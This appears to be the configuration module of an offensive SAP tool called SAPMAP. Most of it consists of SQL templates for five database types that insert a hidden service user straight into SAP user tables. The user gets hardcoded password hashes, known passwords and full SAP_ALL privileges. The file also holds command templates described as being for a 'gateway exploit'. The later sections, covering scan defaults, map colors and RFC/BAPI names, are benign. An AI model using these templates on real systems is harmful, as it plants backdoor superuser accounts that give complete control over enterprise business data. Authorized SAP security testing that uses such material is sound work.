#!/usr/bin/env python3
"""
SAPMAP Configuration — Constants, password hashes, SQL templates, defaults.

Translates the SQL user-creation logic from CREATE_USER_INTERACTIVE_LIN.bat
into pure Python templates usable by the exploitation engine.
"""

# ---------------------------------------------------------------------------
# SAPMAP user creation
# ---------------------------------------------------------------------------

SAPMAP_USER_PREFIX = "SAPMAP"
SAPMAP_USER_MAX = 99   # SAPMAP00 .. SAPMAP99

# Pre-generated password hashes for user SAPMAP00 with password "andinyougo"
# Note: SAP hashes are username-dependent — these are ONLY valid for SAPMAP00.
# Used by the GW exploit (direct DB insert).
SAPMAP_PASSWORD_ABAP = "andinyougo"
SAPMAP_PASSWORD_JAVA = "Andinyoug0"
# Password for BAPI-based user creation (must meet SAP password policies).
SAPMAP_PASSWORD_BAPI = "Andinyougo123!"
BCODE_HEX = "3E6632FB15070BA1"
PASSCODE_HEX = "1C6BB7A000D12A1F250D58C3B5A1674D0A716D19"

# User type S = System / Service user (no dialog logon restrictions apply)
USER_TYPE = "S"
CODVN = "G"  # password hash version (G = SHA-1 salted, common on 7.x kernels)


def sapmap_username(index: int) -> str:
    """Generate SAPMAP username for a given index (00..99)."""
    return f"{SAPMAP_USER_PREFIX}{index:02d}"


# ---------------------------------------------------------------------------
# SQL templates per database type
# ---------------------------------------------------------------------------
# Each template set returns a list of SQL statements.
# Every generator first DELETEs the user if it already exists, then INSERTs.


def _cleanup_sql(client: str, username: str) -> list:
    """DELETE statements to remove a user before re-creating it."""
    return [
        f"DELETE FROM USRBF2 WHERE MANDT='{client}' AND BNAME='{username}'",
        f"DELETE FROM USR04 WHERE MANDT='{client}' AND BNAME='{username}'",
        f"DELETE FROM UST04 WHERE MANDT='{client}' AND BNAME='{username}'",
        f"DELETE FROM USREFUS WHERE MANDT='{client}' AND BNAME='{username}'",
        f"DELETE FROM USR02 WHERE MANDT='{client}' AND BNAME='{username}'",
    ]

def sql_mssql_abap(sid: str, client: str, username: str) -> list:
    """MSSQL ABAP stack — T-SQL statements."""
    SID = sid.upper()
    # Cleanup first, then create
    cleanup = []
    for tbl in ["USRBF2", "USR04", "UST04", "USREFUS", "USR02"]:
        cleanup += [
            f"DELETE FROM {SID}.{tbl} WHERE MANDT='{client}' AND BNAME='{username}'",
            "GO",
        ]
    return [
        f"USE {SID}",
        "GO",
    ] + cleanup + [
        f"INSERT INTO {SID}.USR02 (MANDT,BNAME,USTYP,CODVN) "
        f"VALUES ('{client}','{username}','{USER_TYPE}','{CODVN}')",
        "GO",
        f"UPDATE {SID}.USR02 SET BCODE=0x{BCODE_HEX} "
        f"WHERE MANDT='{client}' AND BNAME='{username}'",
        "GO",
        f"UPDATE {SID}.USR02 SET PASSCODE=0x{PASSCODE_HEX} "
        f"WHERE MANDT='{client}' AND BNAME='{username}'",
        "GO",
        f"INSERT INTO {SID}.USREFUS (MANDT,BNAME,REFUSER) "
        f"VALUES ('{client}','{username}','DDIC')",
        "GO",
        f"INSERT INTO {SID}.UST04 (MANDT,BNAME,PROFILE) "
        f"VALUES ('{client}','{username}','SAP_ALL')",
        "GO",
        f"INSERT INTO {SID}.UST04 (MANDT,BNAME,PROFILE) "
        f"VALUES ('{client}','{username}','SAP_NEW')",
        "GO",
        f"INSERT INTO {SID}.USR04 (MANDT,BNAME,NRPRO,PROFS) "
        f"VALUES ('{client}','{username}','14','C SAP_ALL')",
        "GO",
        # Authorization object entries (USRBF2)
        f"INSERT INTO {SID}.USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_ADMI_FCD','^&_SAP_ALL')",
        "GO",
        f"INSERT INTO {SID}.USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_DATASET','^&_SAP_ALL')",
        "GO",
        f"INSERT INTO {SID}.USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_DEVELOP','^&_SAP_ALL')",
        "GO",
        f"INSERT INTO {SID}.USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_RFC','^&_SAP_ALL')",
        "GO",
        f"INSERT INTO {SID}.USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_TABU_DIS','^&_SAP_ALL')",
        "GO",
        f"INSERT INTO {SID}.USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_TCODE','^&_SAP_ALL')",
        "GO",
        f"INSERT INTO {SID}.USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_USER_AUT','^&_SAP_ALL')",
        "GO",
        f"INSERT INTO {SID}.USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_USER_GRP','^&_SAP_ALL')",
        "GO",
        f"INSERT INTO {SID}.USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_USER_PRO','^&_SAP_ALL')",
        "GO",
        f"INSERT INTO {SID}.USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_XMI_PROD','^&_SAP_ALL')",
        "GO",
    ]


def sql_mssql_java(sid: str, client: str, username: str) -> list:
    """MSSQL Java stack — T-SQL statements (UME_STRINGS table)."""
    SID = sid.upper()
    return [
        f"USE {SID}",
        "GO",
        f"INSERT INTO {SID}.UME_STRINGS (MANDT,BNAME,USTYP,CODVN) "
        f"VALUES ('{client}','{username}','{USER_TYPE}','{CODVN}')",
        "GO",
        f"UPDATE {SID}.UME_STRINGS SET BCODE=0x{BCODE_HEX} "
        f"WHERE MANDT='{client}' AND BNAME='{username}'",
        "GO",
        f"UPDATE {SID}.UME_STRINGS SET PASSCODE=0x{PASSCODE_HEX} "
        f"WHERE MANDT='{client}' AND BNAME='{username}'",
        "GO",
        f"INSERT INTO {SID}.USREFUS (MANDT,BNAME,REFUSER) "
        f"VALUES ('{client}','{username}','DDIC')",
        "GO",
    ]


def sql_maxdb(sid: str, client: str, username: str) -> list:
    """MaxDB — sqlcli statements."""
    return _cleanup_sql(client, username) + [
        f"INSERT INTO USR02 (MANDT,BNAME,BCODE,USTYP,CODVN) "
        f"VALUES ('{client}','{username}','{BCODE_HEX}','{USER_TYPE}','{CODVN}')",
        f"UPDATE USR02 SET PASSCODE='{PASSCODE_HEX}' "
        f"WHERE BNAME='{username}' AND MANDT='{client}'",
        f"INSERT INTO USREFUS (MANDT,BNAME,REFUSER) "
        f"VALUES ('{client}','{username}','DDIC')",
        f"INSERT INTO UST04 (MANDT,BNAME,PROFILE) "
        f"VALUES ('{client}','{username}','SAP_ALL')",
        f"INSERT INTO UST04 (MANDT,BNAME,PROFILE) "
        f"VALUES ('{client}','{username}','SAP_NEW')",
        f"INSERT INTO USR04 (MANDT,BNAME,NRPRO,PROFS) "
        f"VALUES ('{client}','{username}','14','C SAP_ALL')",
        f"INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_ADMI_FCD','^&_SAP_ALL')",
        f"INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_DATASET','^&_SAP_ALL')",
        f"INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_DEVELOP','^&_SAP_ALL')",
        f"INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_RFC','^&_SAP_ALL')",
        f"INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_TABU_DIS','^&_SAP_ALL')",
        f"INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_TCODE','^&_SAP_ALL')",
        f"INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_USER_AUT','^&_SAP_ALL')",
        f"INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_USER_GRP','^&_SAP_ALL')",
        f"INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_USER_PRO','^&_SAP_ALL')",
        f"INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_XMI_PROD','^&_SAP_ALL')",
    ]


def sql_hana(sid: str, client: str, username: str) -> list:
    """HANA DB — hdbsql statements (no schema prefix, -U DEFAULT sets it)."""
    return _cleanup_sql(client, username) + [
        f"INSERT INTO USR02 (MANDT,BNAME,USTYP,CODVN) "
        f"VALUES ('{client}','{username}','{USER_TYPE}','{CODVN}')",
        f"UPDATE USR02 SET BCODE='{BCODE_HEX}' "
        f"WHERE MANDT='{client}' AND BNAME='{username}'",
        f"UPDATE USR02 SET PASSCODE='{PASSCODE_HEX}' "
        f"WHERE MANDT='{client}' AND BNAME='{username}'",
        f"INSERT INTO USREFUS (MANDT,BNAME,REFUSER) "
        f"VALUES ('{client}','{username}','DDIC')",
        f"INSERT INTO UST04 (MANDT,BNAME,PROFILE) "
        f"VALUES ('{client}','{username}','SAP_ALL')",
        f"INSERT INTO UST04 (MANDT,BNAME,PROFILE) "
        f"VALUES ('{client}','{username}','SAP_NEW')",
        f"INSERT INTO USR04 (MANDT,BNAME,NRPRO,PROFS) "
        f"VALUES ('{client}','{username}','14','C SAP_ALL')",
        f"INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_ADMI_FCD','^&_SAP_ALL')",
        f"INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_DATASET','^&_SAP_ALL')",
        f"INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_DEVELOP','^&_SAP_ALL')",
        f"INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_RFC','^&_SAP_ALL')",
        f"INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_TABU_DIS','^&_SAP_ALL')",
        f"INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_TCODE','^&_SAP_ALL')",
        f"INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_USER_AUT','^&_SAP_ALL')",
        f"INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_USER_GRP','^&_SAP_ALL')",
        f"INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_USER_PRO','^&_SAP_ALL')",
        f"INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_XMI_PROD','^&_SAP_ALL')",
    ]


def sql_oracle(sid: str, client: str, username: str) -> list:
    """Oracle — sqlplus statements (SAPSR3 schema, sysdba auth)."""
    cleanup = [f"DELETE FROM SAPSR3.{t} WHERE MANDT='{client}' AND BNAME='{username}';"
               for t in ("USRBF2", "USR04", "UST04", "USREFUS", "USR02")]
    return ["CONNECT / AS SYSDBA;"] + cleanup + [
        f"INSERT INTO SAPSR3.USR02 (MANDT,BNAME,BCODE,USTYP,CODVN) "
        f"VALUES ('{client}','{username}','{BCODE_HEX}','{USER_TYPE}','{CODVN}');",
        f"UPDATE SAPSR3.USR02 SET PASSCODE='{PASSCODE_HEX}' "
        f"WHERE BNAME='{username}' AND MANDT='{client}';",
        f"INSERT INTO SAPSR3.USREFUS (MANDT,BNAME,REFUSER) "
        f"VALUES ('{client}','{username}','DDIC');",
        f"INSERT INTO SAPSR3.UST04 (MANDT,BNAME,PROFILE) "
        f"VALUES ('{client}','{username}','SAP_ALL');",
        f"INSERT INTO SAPSR3.UST04 (MANDT,BNAME,PROFILE) "
        f"VALUES ('{client}','{username}','SAP_NEW');",
        f"INSERT INTO SAPSR3.USR04 (MANDT,BNAME,NRPRO,PROFS) "
        f"VALUES ('{client}','{username}','14','C SAP_ALL');",
        f"INSERT INTO SAPSR3.USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_ADMI_FCD','^&_SAP_ALL');",
        f"INSERT INTO SAPSR3.USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_DATASET','^&_SAP_ALL');",
        f"INSERT INTO SAPSR3.USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_DEVELOP','^&_SAP_ALL');",
        f"INSERT INTO SAPSR3.USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_RFC','^&_SAP_ALL');",
        f"INSERT INTO SAPSR3.USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_TABU_DIS','^&_SAP_ALL');",
        f"INSERT INTO SAPSR3.USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_TCODE','^&_SAP_ALL');",
        f"INSERT INTO SAPSR3.USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_USER_AUT','^&_SAP_ALL');",
        f"INSERT INTO SAPSR3.USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_USER_GRP','^&_SAP_ALL');",
        f"INSERT INTO SAPSR3.USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_USER_PRO','^&_SAP_ALL');",
        f"INSERT INTO SAPSR3.USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_XMI_PROD','^&_SAP_ALL');",
    ]


def sql_db2(sid: str, client: str, username: str) -> list:
    """DB2 — db2 CLI statements."""
    return _cleanup_sql(client, username) + [
        f"INSERT INTO USR02 (MANDT,BNAME,BCODE,USTYP,CODVN) "
        f"VALUES ('{client}','{username}','{BCODE_HEX}','{USER_TYPE}','{CODVN}')",
        f"UPDATE USR02 SET PASSCODE='{PASSCODE_HEX}' "
        f"WHERE BNAME='{username}' AND MANDT='{client}'",
        f"INSERT INTO USREFUS (MANDT,BNAME,REFUSER) "
        f"VALUES ('{client}','{username}','DDIC')",
        f"INSERT INTO UST04 (MANDT,BNAME,PROFILE) "
        f"VALUES ('{client}','{username}','SAP_ALL')",
        f"INSERT INTO UST04 (MANDT,BNAME,PROFILE) "
        f"VALUES ('{client}','{username}','SAP_NEW')",
        f"INSERT INTO USR04 (MANDT,BNAME,NRPRO,PROFS) "
        f"VALUES ('{client}','{username}','14','C SAP_ALL')",
        f"INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_ADMI_FCD','^&_SAP_ALL')",
        f"INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_DATASET','^&_SAP_ALL')",
        f"INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_DEVELOP','^&_SAP_ALL')",
        f"INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_RFC','^&_SAP_ALL')",
        f"INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_TABU_DIS','^&_SAP_ALL')",
        f"INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_TCODE','^&_SAP_ALL')",
        f"INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_USER_AUT','^&_SAP_ALL')",
        f"INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_USER_GRP','^&_SAP_ALL')",
        f"INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_USER_PRO','^&_SAP_ALL')",
        f"INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_XMI_PROD','^&_SAP_ALL')",
    ]


# Map DB type identifier to SQL generator
SQL_GENERATORS = {
    "MSS":      sql_mssql_abap,    # MSSQL
    "MSSQL":    sql_mssql_abap,
    "ADA":      sql_maxdb,          # MaxDB / SAP DB / ADABAS D
    "MAXDB":    sql_maxdb,
    "ADABAS":   sql_maxdb,          # "ADABAS D" after normalize
    "HDB":      sql_hana,           # HANA
    "HANA":     sql_hana,
    "ORA":      sql_oracle,         # Oracle
    "ORACLE":   sql_oracle,
    "DB6":      sql_db2,            # DB2
    "DB2":      sql_db2,
}

# DB CLI command templates (for gateway exploit execution)
DB_CLI_COMMANDS = {
    "MSS":      'sqlcmd -S {db_host} -i {sql_file}',
    "ADA":      'sqlcli -U DEFAULT {sql_statement}',
    "MAXDB":    'sqlcli -U DEFAULT {sql_statement}',
    "ADABAS":   'sqlcli -U DEFAULT {sql_statement}',
    "HDB":      'hdbsql -n {db_host} -i 00 -U DEFAULT -o output.txt -I {sql_file}',
    "ORA":      'sqlplus -S /NOLOG @{sql_file}',
    "DB6":      'db2 {sql_statement}',
}


def normalize_db_type(db_type_raw: str) -> str:
    """Normalize a database type string to a canonical key for SQL_GENERATORS.

    Handles variants like "ADABAS D", "MaxDB", "HDB", "HANA", etc.
    Returns the uppercase canonical key or the cleaned input if unknown.
    """
    dt = db_type_raw.strip().upper()
    # Direct match first
    if dt in SQL_GENERATORS:
        return dt
    # Known aliases / substrings
    if "ADABAS" in dt or "MAXDB" in dt or "ADA" in dt:
        return "ADA"
    if "HDB" in dt or "HANA" in dt:
        return "HDB"
    if "MSS" in dt or "MSSQL" in dt or "MICROSOFT" in dt:
        return "MSS"
    if "ORA" in dt or "ORACLE" in dt:
        return "ORA"
    if "DB2" in dt or "DB6" in dt:
        return "DB6"
    return dt


# ---------------------------------------------------------------------------
# Scanning defaults
# ---------------------------------------------------------------------------

DEFAULT_INSTANCE_RANGE = (0, 99)
DEFAULT_THREADS = 20
DEFAULT_TIMEOUT = 3     # seconds
DEFAULT_POLL_INTERVAL = 3
DEFAULT_MAX_POLL_ATTEMPTS = 40

# Fast scan: only these port patterns
FAST_SCAN_PORT_PATTERNS = {
    "dispatcher": 3200,    # 3200 + instance_nr
    "gateway":    3300,    # 3300 + instance_nr
}

# Additional ports for deep scan (beyond SAPology's full set)
DEEP_SCAN_EXTRA_PORTS = [
    39013, 39015,           # HANA
    7210,                   # MaxDB
    1433,                   # MSSQL
    1521,                   # Oracle
    50000,                  # DB2
]


# ---------------------------------------------------------------------------
# System type colors (matches SAPology pill convention)
# ---------------------------------------------------------------------------

SYSTEM_TYPE_COLORS = {
    "ABAP":            "#0070f2",
    "JAVA":            "#d27700",
    "ABAP+JAVA":       "#0070f2",  # split with orange in rendering
    "BUSINESSOBJECTS": "#8b47d7",
    "CLOUD_CONNECTOR": "#046c7a",
    "CONTENT_SERVER":  "#256f3a",
    "SAPROUTER":       "#788fa6",
    "MDM":             "#5d36ff",
    "HANA":            "#aa0808",
    "MAXDB":           "#e07900",
    "MSSQL":           "#2f5ea0",
    "ORACLE":          "#c74634",
    "DB2":             "#054ada",
}

# Map colors
MAP_BG_COLOR = "#1a1a2e"
MAP_NODE_FILL = "#16213e"
MAP_NODE_BORDER_DEFAULT = "#2ecc71"
MAP_NODE_BORDER_CRITICAL = "#8b0000"    # dark red
MAP_NODE_FILL_PRD = "#4a1a1a"           # red-tinted fill for production
MAP_NODE_FILL_NONPROD = "#4a3a1a"       # orange-tinted fill for non-production
MAP_EDGE_SAP_ALL = "#e74c3c"            # red edge for SAP_ALL connections
MAP_EDGE_NO_SAP_ALL = "#5dade2"         # blue edge for regular connections
MAP_EDGE_GW_EXPLOIT = "#ff6b35"         # orange for GW exploit paths


# ---------------------------------------------------------------------------
# RFC Check function parameters
# ---------------------------------------------------------------------------

RFC_CHECK_FM = "/SDF/RFC_CHECK"
RFC_CHECK_PARAMS = {
    "IV_LOGON": "X",
    "IV_PING": "X",
    "IV_LATENCY": "X",
}
RFC_LOGON_SUCCESS_TEXT = "RFC Logon successful."

# BAPI function module names
BAPI_USER_CREATE = "BAPI_USER_CREATE1"
BAPI_USER_DELETE = "BAPI_USER_DELETE"
BAPI_USER_GET_DETAIL = "BAPI_USER_GET_DETAIL"
BAPI_USER_PROFILES_ASSIGN = "BAPI_USER_PROFILES_ASSIGN"
DEST_RFC_TCPIP_CREATE = "DEST_RFC_TCPIP_CREATE"
RFC_READ_TABLE = "RFC_READ_TABLE"
CNV_MBT_SHELL_GET_CLIENTS = "CNV_MBT_SHELL_GET_CLIENTS"


# ---------------------------------------------------------------------------
# RSRFCCHK (RFC connectivity check program)
# ---------------------------------------------------------------------------

RSRFCCHK_PROGRAM = "RSRFCCHK"
RSRFCCHK_JOB_NAME = "SAPMAP_RFCCHK"
RSRFCCHK_EXTERNAL_USER = "SAPMAP"
